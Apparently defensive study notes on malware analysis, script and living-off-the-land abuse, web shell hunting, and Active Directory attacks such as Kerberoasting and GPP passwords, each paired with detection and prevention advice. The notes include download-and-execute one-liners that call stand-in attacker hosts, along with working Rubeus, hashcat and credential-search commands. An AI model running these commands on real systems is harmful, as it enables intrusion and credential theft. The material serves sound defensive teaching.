upx -d -o unpacked_sample.exe packed_sample.exe

After unpacking, repeat:

strings -n 15 unpacked_sample.exe

docs.title: Static Analysis on Windows
docs.text:
Useful Windows tools:

Tool Purpose PowerShell Get-FileHash File hashing Sysinternals strings String extraction FLOSS Obfuscated string extraction UPX Unpacking UPX-packed files CFF Explorer PE structure inspection PeStudio Static triage Hex editor Raw byte inspection

docs.title: Windows Hashing
docs.text:
Get-FileHash -Algorithm MD5 .\sample.exe
Get-FileHash -Algorithm SHA256 .\sample.exe

docs.title: Windows Strings
docs.text:
strings.exe sample.exe

FLOSS:

floss.exe sample.exe

docs.title: Dynamic Analysis
docs.text:
Dynamic analysis means executing malware in a controlled environment and observing behavior.

It can reveal:

  • Created files
  • Deleted files
  • Registry changes
  • Network connections
  • Child processes
  • Persistence
  • Sandbox checks
  • Payload downloads
  • Process injection
  • C2 behavior

docs.title: Dynamic Analysis Lab
docs.text:
Use an isolated lab.

Recommended setup:

  • Virtual machine
  • No connection to production network
  • Snapshot before execution
  • Fake internet services if needed
  • Monitoring tools running before execution
  • Safe sample handling process

Danger

Never run malware on your host machine or production network.

docs.title: Dynamic Analysis Workflow
docs.text: Phase Action Environment setup Prepare isolated VM Baseline Take snapshot and record clean state Tool deployment Start monitoring tools Execution Run sample Observation Let behavior occur Collection Save logs and captures Analysis Review artifacts Reset Revert VM snapshot

docs.title: Dynamic Analysis Tools
docs.text: Tool Purpose ProcMon File, registry, process activity Noriben Filters ProcMon output Wireshark Network traffic INetSim Fake internet services Regshot Registry before/after comparison ProcDot Visualize ProcMon activity Cuckoo Sandbox Automated sandbox Joe Sandbox Automated sandbox

docs.title: Noriben
docs.text:
Noriben is a Python wrapper around Sysinternals ProcMon.

It:

  • Starts ProcMon
  • Captures activity
  • Filters common system noise
  • Produces a readable report

Basic workflow:

python Noriben.py

Then:

  1. Run the malware.
  2. Wait for behavior.
  3. Press CTRL+C in Noriben.
  4. Review the generated report.

Noriben reports may include:

  • File activity
  • Registry activity
  • Process activity
  • Network activity

docs.title: Noriben Caveat
docs.text:
Noriben filters noise, but filtering can hide important details.

If malware exits immediately or appears inactive:

  • Review raw ProcMon logs
  • Check for sandbox evasion
  • Check registry/environment queries
  • Check failed network checks
  • Check parent process checks
  • Check VM artifacts

docs.title: Automated Sandboxes
docs.text:
Automated sandboxes execute malware and generate reports.

Benefits:

  • Fast triage
  • Repeatable execution
  • Behavior summaries
  • Screenshots
  • Network indicators
  • Dropped file extraction

Limitations:

  • Malware may detect sandboxing
  • Behavior may differ from real systems
  • Network simulation may be incomplete
  • Advanced samples may sleep or evade

docs.title: Reverse Engineering
docs.text:
Reverse engineering analyzes compiled code when source code is unavailable.

It helps uncover:

  • Hidden logic
  • Control flow
  • Encryption routines
  • Obfuscated strings
  • Sandbox evasion
  • Process injection
  • C2 protocol details
  • Configuration extraction

docs.title: Reverse Engineering Tools
docs.text: Tool Type Examples Use Disassembler IDA, Ghidra, Cutter Static code analysis Debugger x64dbg, OllyDbg, IDA debugger Step through execution Decompiler Ghidra, IDA Hex-Rays Pseudocode recovery

docs.title: IDA Basics
docs.text:
Common IDA views:

View Purpose Graph View Visual control flow Text View Linear disassembly

Shortcuts:

Shortcut Action Space Toggle graph/text view Enter Jump into function or reference Esc Go back N Rename function or variable

docs.title: Assembly Indicators
docs.text: Pattern / API Meaning test eax, eax + jz Check if return value is zero lea Load address of string or structure RegOpenKeyExA Registry access InternetOpenUrlA URL access/download CreateFileA File creation/access WriteFile File write CreateProcessA Process creation VirtualAllocEx Remote memory allocation WriteProcessMemory Remote memory write CreateRemoteThread Process injection indicator

docs.title: Common Malware Behaviors
docs.text: Behavior Possible Indicator Persistence Run keys, services, scheduled tasks Defense evasion Sandbox checks, packed code Credential access LSASS access Discovery whoami, ipconfig, net commands C2 Periodic outbound connections Payload download HTTP request to executable Injection Remote thread creation Exfiltration Archive creation then upload

docs.title: Detection Engineering After Analysis
docs.text:
After analysis, create detections.

Finding Detection Type Unique file strings YARA PE structure YARA Malware behavior Sigma Network domain/IP SIEM/DNS/Proxy rule Process chain Sigma/SIEM File drop path Sigma/Sysmon Registry persistence Sigma/Sysmon C2 pattern IDS/SIEM

docs.title: YARA for Malware Files
docs.text:
Example:

rule Shell_Sandbox_Detection
{
    strings:
        $sandbox_string = "Sandbox detected"

    condition:
        $sandbox_string
}

A stronger rule should include multiple unique strings and file constraints.

Example:

rule Suspicious_Dropper
{
    strings:
        $s1 = "Sandbox detected"
        $s2 = "Connection sent to C2"
        $s3 = "WindowsUpdater"
        $s4 = "http://ms-windows-update.com/svchost.exe"

    condition:
        uint16(0) == 0x5A4D and 2 of them
}

docs.title: yarGen
docs.text:
yarGen can generate candidate YARA rules from samples.

Workflow:

mkdir Test
cp sample.exe Test/
sudo python3 yarGen.py -m ./Test/

Then review:

yargen_rules.yar

Always review generated rules before using them.

docs.title: Sigma for Malware Behavior
docs.text:
Sigma detects behavior in logs.

Example: suspicious file creation in temp:

title: Suspicious File Drop In User Temp
status: experimental
description: Detects suspicious file creation in a user temp location
logsource:
  product: windows
  category: file_event
detection:
  selection:
    TargetFilename|contains: '\AppData\Local\Temp\'
    TargetFilename|endswith: '\svchost.exe'
  condition: selection
level: high

Useful Sysmon events:

Event ID Meaning 1 Process creation 3 Network connection 7 Image loaded 10 Process access 11 File creation 12/13/14 Registry activity

docs.title: Malware Analysis Cheat Sheet
docs.text: Task Tool / Command Identify file file sample.exe View header hexdump -C sample.exe \| head SHA256 hash sha256sum sample.exe Windows hash Get-FileHash -Algorithm SHA256 .\sample.exe Fuzzy hash ssdeep sample.exe Extract strings strings -n 15 sample.exe Decode strings floss sample.exe Unpack UPX upx -d sample.exe Dynamic behavior ProcMon / Noriben Network behavior Wireshark Reverse engineering IDA / Ghidra File detection YARA Behavior detection Sigma

docs.title: Notes to Remember
docs.text:
• Static analysis is safer but may miss runtime behavior.
  • Dynamic analysis reveals behavior but requires isolation.
  • Packed malware should be unpacked before deeper static analysis.
  • Imports reveal possible capabilities.
  • Strings are useful but easy for attackers to change.
  • Process injection often involves VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread.
  • Detection rules should be tested and tuned before production.

docs.title: Malware Concepts
docs.text:
Malware can appear as compiled binaries, scripts, fileless payloads, or abuse of legitimate operating system tools.

For defenders, the important question is not only what the malware file is, but also how it executes, persists, downloads payloads, hides, and abuses trusted tools.

docs.title: Binary vs Script-Based Malware
docs.text:
Malware commonly appears in two broad forms:

Type Description Common Examples Binary malware Compiled executable code .exe, .dll, .elf Script-based malware Interpreted code run by another program .ps1, .bat, .js, .vbs, .sh

Both can be dangerous, but they behave differently from a detection perspective.

docs.title: Binary Malware
docs.text:
Binary malware is compiled from a programming language such as C, C++, Go, Rust, or Delphi into machine code.

Common formats:

.exe
.dll
.elf
.sys

Typical traits:

  • Runs directly on the target OS.
  • Has a stable file structure once compiled.
  • Can be identified with cryptographic hashes.
  • Often contains imports, sections, resources, and embedded strings.
  • Can be analyzed with static and dynamic malware analysis tools.

docs.title: Binary Malware Detection
docs.text:
Common binary indicators:

Indicator Use MD5 / SHA256 hash Identify exact file Import hash Cluster related PE samples YARA strings Detect unique strings or byte patterns PE sections Detect packed or abnormal files File metadata Compiler, timestamp, resources Behavior logs Detect execution, network, persistence

A filename can change without changing the hash.

Example:

invoice.exe
safe.doc.exe
update.exe

If the file content is identical, the hash stays the same.

docs.title: Script-Based Malware
docs.text:
Script-based malware is interpreted by another program.

Common interpreters:

powershell.exe
cmd.exe
wscript.exe
cscript.exe
mshta.exe
bash
python
node

Common formats:

.ps1
.bat
.cmd
.vbs
.js
.sh
.py

docs.title: Why Script Malware Is Harder to Detect
docs.text:
Script malware is easy to change.

Attackers can alter:

  • Variable names
  • Whitespace
  • Encoding
  • Comments
  • String construction
  • Download URLs
  • Command order

Even a one-character change changes the file hash.

This makes hash-only detection weak for script-based malware.

docs.title: Fileless Execution
docs.text:
Script malware can run code directly in memory.

Example pattern:

IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')

Why this matters:

  • The payload may never be written to disk.
  • Traditional file scanning may miss it.
  • Detection depends on command-line logging, script block logging, memory analysis, and network telemetry.

docs.title: Common Malicious Script Behaviors
docs.text: Behavior Examples Downloading payloads Invoke-WebRequest, curl, wget In-memory execution IEX, reflection, encoded commands Defense evasion Disable Defender, bypass execution policy Obfuscation Base64, XOR, string splitting Persistence Scheduled tasks, run keys, cron Credential theft Browser data, tokens, LSASS access

docs.title: Simple Downloader Example
docs.text:
A noisy batch downloader may look like this:

@echo off
powershell -Command "Invoke-WebRequest http://malicious.site/payload.exe -OutFile C:\Users\Public\payload.exe"
start C:\Users\Public\payload.exe

Detection ideas:

  • powershell.exe spawned by cmd.exe
  • Download to C:\Users\Public
  • Execution shortly after download
  • Network connection to rare domain

docs.title: Suspicious PowerShell One-Liner
docs.text:
powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://malicious.site/payload.ps1')"

Suspicious flags and terms:

Token Meaning -nop No profile -w hidden Hidden window -c Execute command IEX Invoke-Expression DownloadString Download script into memory

IEX is especially dangerous because it executes a string as code.

docs.title: Obfuscation
docs.text:
Obfuscation hides malware logic from humans and basic detections.

Common methods:

  • Base64 encoding
  • String splitting
  • Character arrays
  • XOR encryption
  • Compression
  • Random variable names
  • Reordering code
  • Reflection-based execution

Example indicators:

-EncodedCommand
FromBase64String
IEX
[Reflection.Assembly]::Load

docs.title: Case Study Pattern: Stealer Scripts
docs.text:
Modern stealers often use layered scripts.

Typical flow:

Large encoded blob
  -> decoding function
  -> in-memory loader
  -> credential/browser/token theft
  -> exfiltration

Defensive focus:

  • Detect the loader behavior.
  • Capture the command line.
  • Decode script blocks.
  • Review network connections.
  • Identify persistence changes.
  • Extract IOCs from decoded payloads.

docs.title: Living Off The Land
docs.text:
Living Off The Land attacks use legitimate tools already present on the operating system.

These tools are often called LOLBins.

The attacker avoids dropping obvious malware and instead abuses trusted binaries for:

  • Execution
  • Downloading
  • Decoding
  • Persistence
  • Lateral movement
  • Defense evasion

docs.title: Why LOTL Is Dangerous
docs.text:
LOTL is effective because:

  • The tools are signed and trusted.
  • Admins use the same tools legitimately.
  • Static antivirus may not flag them.
  • Blocking them completely can break operations.
  • Detection must focus on behavior and context.

The key question becomes:

Is this legitimate tool being used in an abnormal way?

docs.title: Common Windows LOLBins
docs.text: Tool Common Abuse PowerShell Fileless execution, download cradles WMIC Remote process execution, recon Certutil Download files, encode/decode Base64 MSHTA Execute HTA/JScript/VBScript Rundll32 Execute DLLs or proxy execution Schtasks Persistence via scheduled tasks

docs.title: PowerShell Abuse
docs.text:
PowerShell is heavily abused because it can:

  • Download remote content
  • Execute code in memory
  • Access .NET
  • Run encoded payloads
  • Automate system administration
  • Bypass basic restrictions

Suspicious flags:

-NoProfile
-NoP
-WindowStyle Hidden
-W Hidden
-ExecutionPolicy Bypass
-Exec Bypass
-EncodedCommand
-enc

Suspicious keywords:

IEX
Invoke-Expression
DownloadString
Invoke-WebRequest
Net.WebClient
FromBase64String
Reflection.Assembly

docs.title: Certutil Abuse
docs.text:
Certutil is a legitimate certificate utility.

Attackers abuse it to download or decode payloads.

Download example:

certutil -urlcache -split -f "http://attacker.example/payload.exe" C:\Users\Public\payload.exe

Decode example:

certutil -decode encoded.txt payload.exe

Detection focus:

-urlcache
-split
-f
-decode
-encode

docs.title: WMIC Abuse
docs.text:
WMIC can create processes locally or remotely.

Remote execution pattern:

wmic /node:TARGETHOST process call create "powershell -NoP -Command ..."

Detection focus:

  • wmic.exe
  • /node:
  • process call create
  • Remote host targeting
  • PowerShell or cmd launched by WMIC

docs.title: MSHTA Abuse
docs.text:
MSHTA executes HTML Applications.

Attackers use it to run remote or inline scripts.

Suspicious patterns:

mshta http://attacker.example/payload.hta
mshta "javascript:..."

Detection focus:

  • mshta.exe making network connections
  • javascript: in command line
  • vbscript: in command line
  • Office spawning MSHTA

docs.title: Rundll32 Abuse
docs.text:
Rundll32 executes exported DLL functions.

Suspicious patterns:

rundll32.exe C:\Users\Public\evil.dll,EntryPoint

Detection focus:

  • DLLs loaded from user-writable directories
  • Rundll32 with strange command lines
  • Rundll32 making network connections
  • Office or browser spawning Rundll32

Suspicious locations:

C:\Users\Public\
C:\Users\<user>\AppData\Local\Temp\
C:\Windows\Temp\
Downloads

docs.title: Scheduled Task Abuse
docs.text:
Attackers use scheduled tasks for persistence.

Example:

schtasks /Create /SC ONLOGON /TN "WindowsUpdate" /TR "powershell -NoP ..."

Detection focus:

schtasks.exe /Create
Event ID 4698
Tasks with suspicious names
Tasks executing scripts from Temp/Public
Tasks running PowerShell or cmd

docs.title: LOTL Detection Strategy
docs.text:
Strong detections rely on context.

Look for:

  • Suspicious parent-child process relationships
  • Dangerous command-line arguments
  • Network connections from unusual binaries
  • Execution from user-writable directories
  • Encoded or obfuscated commands
  • Scheduled task creation
  • Script interpreters launched by Office documents
  • LOLBins launched by web server processes

docs.title: Suspicious Parent-Child Examples
docs.text: Parent Child Why Suspicious winword.exe powershell.exe Possible macro execution excel.exe cmd.exe Possible malicious document w3wp.exe cmd.exe Possible web shell apache.exe powershell.exe Possible server compromise wmic.exe powershell.exe Possible remote execution mshta.exe powershell.exe Script proxy execution

docs.title: Useful Telemetry
docs.text: Source Use Security Event ID 4688 Process creation Sysmon Event ID 1 Process creation with command line Sysmon Event ID 3 Network connection Sysmon Event ID 7 Image loaded Sysmon Event ID 11 File created Event ID 4698 Scheduled task created PowerShell Event ID 4104 Script block logging

docs.title: Mitigation Ideas
docs.text:
• Enable PowerShell Script Block Logging.
  • Enable process command-line logging.
  • Use Sysmon or EDR.
  • Restrict PowerShell where possible.
  • Use AppLocker or WDAC.
  • Monitor C:\Users\Public, Temp, and Downloads.
  • Block Office child process abuse where possible.
  • Review scheduled task creation.
  • Alert on suspicious LOLBin arguments.

docs.title: Quick Reference
docs.text: Malware Concept Defensive Focus Binary malware Hashes, YARA, PE metadata, behavior Script malware Command line, interpreter usage, script logs Fileless execution PowerShell logs, memory, network Obfuscation Decode script blocks, look for suspicious tokens LOTL Context, arguments, parent-child relationships Persistence Tasks, run keys, services, startup folders

docs.title: Notes to Remember
docs.text:
• Binary malware is easier to hash exactly.
  • Script malware is easier to mutate.
  • Fileless attacks reduce disk artifacts.
  • IEX, DownloadString, and -EncodedCommand are major PowerShell warning signs.
  • LOTL detection depends on how a trusted binary is used, not just that it ran.

docs.title: Web Security Monitoring
docs.text:
Web security monitoring focuses on detecting suspicious activity against web applications and web servers.

This includes web shells, suspicious uploads, command execution through HTTP requests, scanning, brute force activity, and DoS/DDoS patterns.

docs.title: Web Shells
docs.text:
A web shell is a malicious server-side script uploaded to a web server to give an attacker remote command execution through HTTP.

Common languages:

PHP
ASP
ASPX
JSP

Web shells are often used for:

  • Initial access
  • Persistence
  • Reconnaissance
  • Command execution
  • File browsing
  • Data exfiltration
  • Lateral movement

docs.title: How Web Shells Are Deployed
docs.text:
Common deployment vectors:

Vector Description File upload vulnerability Application accepts executable script uploads Misconfiguration Web server allows dangerous file types CMS compromise Plugin/theme/editor abuse RCE vulnerability Attacker writes shell file through command execution Stolen admin credentials Attacker uploads through admin panel

High-risk folders:

/uploads/
/images/
/tmp/
/cache/
/wp-content/uploads/
/admin/

docs.title: Web Shell Capabilities
docs.text:
A web shell may allow:

  • Command execution
  • File upload/download
  • Database access
  • Credential theft
  • Reverse shell staging
  • File deletion
  • Log tampering
  • Internal network pivoting

Common server-side execution functions include:

system
exec
shell_exec
passthru
eval
assert
base64_decode

docs.title: Web Shell Examples in the Wild
docs.text: Web Shell Notes China Chopper Small server payload with rich client WSO Feature-rich PHP shell C99 / R57 Classic PHP shells Exchange web shells Seen in ProxyLogon-style intrusions

docs.title: Web Server Log Analysis
docs.text:
Web server access logs are the first place to look.

Common log fields:

Field Use Source IP Identify requester Timestamp Build timeline Method GET, POST, PUT, HEAD URI Requested path Status code Success/failure Bytes Response size Referrer How request was reached User-Agent Browser/tool identity

docs.title: Suspicious Request Patterns
docs.text:
Watch for:

  • Repeated requests to unknown .php, .aspx, or .jsp files
  • POST requests to files in upload directories
  • Direct access with no referrer
  • Command-like query parameters
  • Unusual User-Agent strings
  • Repeated access from one IP
  • Access outside normal hours
  • New script files receiving traffic shortly after upload

docs.title: Suspicious Request Methods
docs.text: Method Normal Use Suspicious Use GET Retrieve page/resource Trigger shell via query string POST Submit forms Send commands to shell PUT Update/upload resource Upload web shell HEAD Retrieve metadata Probe if shell exists

docs.title: Suspicious Query Strings
docs.text:
Look for parameters and commands like:

cmd=
exec=
command=
shell=
whoami
id
uname
cat /etc/passwd
powershell
cmd.exe
base64

Encoded values are also suspicious.

Example:

cmd=d2hvYW1p

This may decode to:

whoami

docs.title: Suspicious User-Agents
docs.text:
Examples:

curl
wget
python-requests
python-urllib
Go-http-client
Mozilla/4.0
empty User-Agent

Tool-like User-Agents are more suspicious when paired with sensitive paths or command parameters.

docs.title: System-Level Confirmation
docs.text:
Web logs show requests, but they do not prove command execution.

Correlate with system logs.

Example attack chain:

Apache access log:
POST /uploads/image.php

Linux audit log:
www-data executes /bin/sh

Conclusion:
The uploaded PHP file likely executed system commands.

docs.title: Auditd for Web Shell Detection
docs.text:
Auditd can confirm file creation or command execution.

Useful targets to monitor:

/var/www/
/usr/share/nginx/html/
/var/www/html/uploads/
/etc/passwd
/etc/shadow
/bin/sh
/bin/bash

Example searches:

ausearch -k web_shell
ausearch -f /var/www/html/uploads/
ausearch -x bash
ausearch -x sh

docs.title: File System Hunting
docs.text:
Web shells must usually exist somewhere on disk.

Look for:

  • New PHP/ASPX/JSP files in upload directories
  • Random file names
  • Double extensions
  • Recently modified scripts
  • Suspicious functions
  • Encoded blobs
  • Unexpected files owned by web server user

Double-extension examples:

image.jpg.php
avatar.png.jsp
invoice.pdf.aspx

docs.title: Find Recently Modified Web Files
docs.text:
find /var/www -type f -name "*.php" -newerct "2025-07-01" ! -newerct "2025-08-01"

Find scripts in upload directories:

find /var/www -type f \( -name "*.php" -o -name "*.jsp" -o -name "*.aspx" \)

docs.title: Search for Dangerous Functions
docs.text:
grep -R "eval(" /var/www
grep -R "system(" /var/www
grep -R "shell_exec" /var/www
grep -R "base64_decode" /var/www

These functions are not always malicious, but they deserve review when found in writable web directories.

docs.title: Network Traffic Analysis
docs.text:
PCAP analysis can reveal:

  • Uploaded web shell source code
  • Command parameters
  • Encoded payloads
  • Attacker IP
  • File upload flow
  • C2 staging
  • Data exfiltration through HTTP

Useful Wireshark filters:

Goal Filter POST requests http.request.method == "POST" PHP requests http.request.uri contains ".php" User-Agent review http.user_agent Known attacker IP ip.addr == <ATTACKER_IP>

docs.title: Web Shell Correlation Strategy
docs.text:
Strong evidence comes from correlation.

Evidence Meaning POST to upload endpoint Possible shell upload New .php in uploads Suspicious file creation POST to that .php Shell interaction www-data spawning shell Command execution confirmed Outbound connection after command Payload staging or exfiltration

docs.title: DoS and DDoS Monitoring
docs.text:
Denial-of-Service attacks attempt to make a service unavailable.

Type Description DoS One source overwhelms target DDoS Many distributed sources overwhelm target Application-layer DoS Abuses expensive web endpoints

docs.title: DoS/DDoS Indicators in Web Logs
docs.text: Indicator Example High request rate One IP sends hundreds of requests per second Burst timestamps Many requests in same second Odd User-Agents curl, python-requests, bot strings Geo anomalies Sudden traffic from unusual regions 5xx spike Server begins failing Heavy endpoint abuse /login, /search, /checkout Large query parameters limit=999999

docs.title: Expensive Endpoints
docs.text:
Attackers may target endpoints that cost more server resources.

Examples:

/login
/register
/search
/products
/api/*
/cart
/checkout

These may trigger:

  • Database queries
  • Password hashing
  • Session handling
  • Token validation
  • Payment API calls
  • Search indexing

docs.title: Web Log Triage Questions
docs.text:
Ask:

  • Which IPs generated the most requests?
  • Which endpoints were targeted?
  • Did status codes change?
  • Are there 5xx spikes?
  • Are User-Agents normal?
  • Is traffic geographically unusual?
  • Is a single endpoint receiving abnormal traffic?
  • Did suspicious uploads happen before shell activity?
  • Did the web server spawn OS commands?

docs.title: Example Hunting Ideas
docs.text:
Top source IPs:

awk '{print $1}' access.log | sort | uniq -c | sort -nr | head

Top requested paths:

awk '{print $7}' access.log | sort | uniq -c | sort -nr | head

Look for shell-like parameters:

grep -Ei "cmd=|exec=|whoami|/etc/passwd|base64" access.log

Look for POSTs to scripts:

grep '"POST ' access.log | grep -Ei "\.php|\.aspx|\.jsp"

docs.title: Response Actions
docs.text:
For suspected web shell:

  • Preserve web logs
  • Preserve suspicious files
  • Hash suspicious files
  • Isolate server if needed
  • Remove exposed shell after evidence collection
  • Review upload validation
  • Review web directory permissions
  • Search for other shells
  • Rotate credentials
  • Patch initial vulnerability
  • Monitor for reinfection

For DoS/DDoS:

  • Confirm traffic pattern
  • Identify top sources and endpoints
  • Apply rate limiting
  • Block obvious malicious sources
  • Use CDN/WAF controls
  • Scale if needed
  • Preserve logs for investigation
  • Review application bottlenecks

docs.title: Quick Reference
docs.text: Goal Command / Filter Find POST requests in PCAP http.request.method == "POST" Find PHP traffic in PCAP http.request.uri contains ".php" Find suspicious functions grep -R "system(" /var/www Find recent PHP changes find /var/www -type f -name "*.php" -newerct <date> Find suspicious parameters grep -Ei "cmd=|exec=|whoami" access.log Confirm execution Auditd process execution logs Find DoS top IPs Count source IPs in access logs

docs.title: Notes to Remember
docs.text:
• Web logs show requests, not proof of execution.
  • System logs confirm whether the web process spawned commands.
  • Web shells often hide in writable upload directories.
  • Double extensions are suspicious in web roots.
  • DoS investigations rely heavily on request rate, endpoint, and status-code patterns.

docs.title: Active Directory Attack Paths and Detection
docs.text:
Active Directory attacks often abuse legitimate identity, authentication, and administration features rather than traditional software vulnerabilities. Many of these techniques rely on weak passwords, excessive permissions, insecure delegation, exposed credentials, or misconfigured certificate templates.

This note covers common AD attack paths, how they work, what attackers need, and how defenders can prevent and detect them.

docs.title: Kerberoasting
docs.text: Kerberoasting targets service accounts with registered Service Principal Names (SPNs). Any authenticated domain user can request a Kerberos service ticket for an SPN. That ticket is encrypted with the service account password hash, allowing attackers to extract it and crack it offline.

docs.title: Why It Works
docs.text:
When a user requests access to a Kerberos-backed service, the Domain Controller issues a Ticket Granting Service (TGS) ticket.

The important part is that the TGS is encrypted using the password hash of the service account that owns the SPN.

Attackers abuse this by:

  • Finding accounts with SPNs
  • Requesting TGS tickets for those accounts
  • Exporting the ticket hashes
  • Cracking them offline

No interaction with the actual service host is required.

docs.title: Encryption Types
docs.text:
Encryption Type Risk RC4 Weak and fast to crack AES-128 / AES-256 Much slower to crack DES Legacy and insecure

Attackers often try to obtain RC4-encrypted tickets because they are much faster to crack.

docs.title: Attack Path
docs.text:
Enumerate and extract TGS hashes with Rubeus:

.\Rubeus.exe kerberoast /outfile:spn.txt

Crack with Hashcat:

hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile cracked.txt

Crack with John:

sudo john spn.txt --format=krb5tgs --wordlist=passwords.txt

docs.title: Prevention
docs.text:
Use strong, random service account passwords. Service accounts should have long passwords, ideally 25+ characters.

Use Group Managed Service Accounts (gMSA) where possible. These accounts are managed by AD and automatically rotate long, complex passwords.

Disable or restrict RC4 where possible and prefer AES Kerberos encryption.

Remove unnecessary SPNs from accounts that do not need them.

docs.title: Detection
docs.text:
Monitor Event ID 4769: Kerberos service ticket requested.

Detection ideas:

  • A single user requesting many unique service tickets in a short time
  • RC4 tickets in an environment that should use AES
  • TGS requests from unusual workstations or subnets
  • Requests for sensitive or fake service accounts

docs.title: Honeypot Idea
docs.text:
Create a fake service account with an SPN, no real privileges, and a strong password.

Example:

svc_backup_legacy

Any TGS request for this account should be treated as suspicious.

docs.title: AS-REProasting
docs.text:
AS-REProasting targets accounts that have Kerberos preauthentication disabled. If preauthentication is not required, an attacker can request authentication data for that account and crack it offline.

Unlike Kerberoasting, this attack does not require the target account to have an SPN.

docs.title: Why It Works
docs.text:
Normally, Kerberos requires the user to prove knowledge of their password before the KDC issues authentication material.

If the account has Do not require Kerberos preauthentication enabled:

  • The attacker sends an AS-REQ for the target user
  • The KDC responds with an AS-REP
  • Part of the response is encrypted with the user password hash
  • The attacker cracks it offline

docs.title: Attack Path
docs.text:
Extract vulnerable AS-REP hashes with Rubeus:

.\Rubeus.exe asreproast /outfile:asrep.txt

Crack with Hashcat:

sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force

docs.title: Prevention
docs.text:
Disable Do not require Kerberos preauthentication unless there is a real legacy requirement.

Regularly audit accounts for this setting.

Use strong passwords for any account that must keep this setting enabled.

docs.title: Detection
docs.text:
Monitor Event ID 4768: Kerberos authentication ticket requested.

Detection ideas:

  • Pre-authentication type is 0
  • RC4 encryption requested where AES is expected
  • One source requesting TGTs for many users
  • Authentication attempts against decoy users

docs.title: Honeypot Idea
docs.text:
Create a fake account with preauthentication disabled and a strong password.

Example:

backup_svc_legacy

Any TGT request for this user is suspicious.

docs.title: GPP Passwords
docs.text:
Group Policy Preferences (GPP) used to allow administrators to store credentials for local users, scheduled tasks, mapped drives, and services inside XML files in SYSVOL.

These passwords were stored as cpassword values. Microsoft encrypted them with AES-256, but the private key was published publicly. As a result, any authenticated domain user can read and decrypt exposed GPP passwords.

docs.title: Why It Works
docs.text:
GPP credential files may exist in SYSVOL:

\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\

Common files include:

Groups.xml
ScheduledTasks.xml
Services.xml
Drives.xml
DataSources.xml
Printers.xml

SYSVOL is readable by authenticated users, so any domain user can search for cpassword.

docs.title: Attack Path
docs.text:
Use PowerSploit:

Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword

Example output:

UserName  : svc-iis
Password  : abcd@123
File      : \\EAGLE.LOCAL\SYSVOL\...\Groups.xml
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ...

docs.title: Prevention
docs.text:
Install the Microsoft patch that prevents new GPP passwords from being created.

Manually clean up old XML files containing cpassword.

Use LAPS or another password management solution instead of GPP for local administrator passwords.

Search SYSVOL for exposed credentials:

Get-ChildItem "\\domain.local\SYSVOL" -Recurse -Include *.xml | Select-String "cpassword"

docs.title: Detection
docs.text:
Enable file access auditing on SYSVOL.

Monitor Event ID 4663 for suspicious reads of XML files inside SYSVOL policies.

Watch for logon attempts using accounts discovered in old GPP files.

docs.title: Honeypot Idea
docs.text:
Place a fake GPP-style XML file in SYSVOL containing a fake credential.

Alert on:

  • File reads of the fake XML
  • Failed logons using the fake account
  • Any authentication attempt for the decoy user

docs.title: GPO Permissions and GPO Files
docs.text: Group Policy Objects (GPOs) control domain-wide configuration. If attackers can edit a GPO or replace files referenced by a GPO, they can execute code across many machines.

docs.title: Weak GPO Delegation
docs.text:
A GPO may grant edit rights to users or groups that should not have them.

Dangerous permissions include:

  • Edit settings
  • Modify security
  • WriteDACL
  • GenericAll
  • GenericWrite

If a low-privileged user can edit a GPO linked to a sensitive OU, they can add:

  • Startup scripts
  • Logon scripts
  • Scheduled tasks
  • Software installation payloads

docs.title: Weak Referenced File Permissions
docs.text:
Even if the GPO itself is secure, the files it references may not be.

Example:

\\fileserver\deploy\install_chrome.msi
\\domain.local\SYSVOL\scripts\logon.bat

If attackers can overwrite these files, the GPO may execute their payload.

docs.title: Prevention
docs.text:
Restrict who can edit GPOs.

Do not delegate GPO control to broad groups.

Protect scripts and installers referenced by GPOs.

Ensure GPOs linked to Domain Controllers or Tier 0 systems are managed only by Tier 0 administrators.

docs.title: Detection
docs.text:
Monitor Event ID 5136 for directory object modifications.

Focus on objects where:

ObjectClass = groupPolicyContainer

Alert when the modifying account is not an approved administrator or change management account.

docs.title: Honeypot Idea
docs.text:
Create an unlinked GPO with a tempting name:

Legacy_Admin_Scripts
Workstation_Patch_Deploy

Give it intentionally weak edit permissions, but do not link it to production OUs.

Alert on any modification to that GPO.

docs.title: Credentials in Network Shares
docs.text: Plaintext credentials are often found in scripts and configuration files stored on network shares. This is one of the most common AD misconfigurations.

docs.title: Common Causes
docs.text:
Credentials appear in shares because of:

  • Hardcoded service passwords
  • Temporary admin scripts
  • Old deployment files
  • Web application configs
  • Backup scripts
  • Mapped drive scripts
  • Over-permissive shares

Hidden shares ending in $ are not secure. They are only hidden from casual browsing.

docs.title: Common File Types
docs.text: File Type Why It Matters .ps1 PowerShell scripts may contain credentials .bat / .cmd Legacy admin scripts .config Web or application connection strings .xml Application settings or GPP leftovers .ini Service configuration .txt Notes, passwords, temporary files

docs.title: Attack Path
docs.text:
Find readable shares with PowerView:

Invoke-ShareFinder -Domain eagle.local -ExcludeStandard -CheckShareAccess

Search files with native Windows tools:

findstr /s /i /m "password" *.config *.xml *.ini *.txt

Search for domain references:

findstr /s /i "eagle" *.ps1 *.bat

docs.title: Prevention
docs.text:
Remove broad access from sensitive shares.

Avoid granting access to:

Everyone
Authenticated Users
Domain Users

Use a secrets management system instead of hardcoded credentials.

Regularly scan shares for keywords such as:

password
passwd
pwd
secret
token
apikey
connectionString

docs.title: Detection
docs.text:
Look for one workstation connecting to many shares or many hosts over SMB in a short time.

Alert on authentication attempts using accounts that only appear in decoy files.

docs.title: Honeypot Idea
docs.text:
Create a fake script on a readable share:

# db_connect.ps1
$user = "eagle\svc_sql_backup"
$pass = "Winter2020!"

The password should be fake.

Alert on failed logons for:

svc_sql_backup

docs.title: Credentials in Object Properties
docs.text:
Administrators sometimes store passwords in AD object fields such as Description, Info, or Comment.

The problem is that most authenticated users can read these fields by default.

docs.title: Common Fields
docs.text: Field Risk Description Often contains notes or passwords Info Can contain admin notes Comment May contain setup details Notes Sometimes used for service account instructions

docs.title: Attack Path
docs.text:
Search user object properties:

Get-ADUser -Filter {Description -like "*pass*" -or Info -like "*pass*"} -Properties Description,Info | Select-Object Name,Description,Info

Example finding:

